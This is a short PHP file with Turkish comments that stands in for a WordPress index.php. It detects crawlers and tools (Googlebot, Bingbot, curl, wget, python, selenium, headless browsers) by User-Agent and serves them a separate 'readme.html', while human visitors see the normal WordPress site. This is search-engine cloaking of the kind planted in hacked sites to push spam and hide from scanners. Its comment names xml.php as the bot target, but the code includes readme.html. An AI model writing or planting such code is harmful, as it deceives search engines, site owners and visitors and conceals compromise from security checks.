<?php
// Bot Detection + Redirect Sistemi
// Kullanıcılar → Normal site
// Botlar → xml.php

// Bot User-Agent'leri
$botPatterns = array(
    'googlebot',
    'bingbot',
    'slurp',
    'duckduckbot',
    'baiduspider',
    'yandexbot',
    'facebookexternalhit',
    'twitterbot',
    'linkedinbot',
    'whatsapp',
    'telegram',
    'curl',
    'wget',
    'python',
    'java',
    'go-http-client',
    'scrapy',
    'selenium',
    'phantomjs',
    'headless'
);

$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$isBot = false;

// Bot kontrolü
foreach ($botPatterns as $pattern) {
    if (strpos($userAgent, $pattern) !== false) {
        $isBot = true;
        break;
    }
}

// Bot ise xml.php'ye yönlendir
if ($isBot) {
    include 'readme.html';
    exit;
}

// Normal kullanıcılar için WordPress
// WordPress'in normal index.php kodu
define('WP_USE_THEMES', true);
require(dirname(__FILE__) . '/wp-blog-header.php');
?>
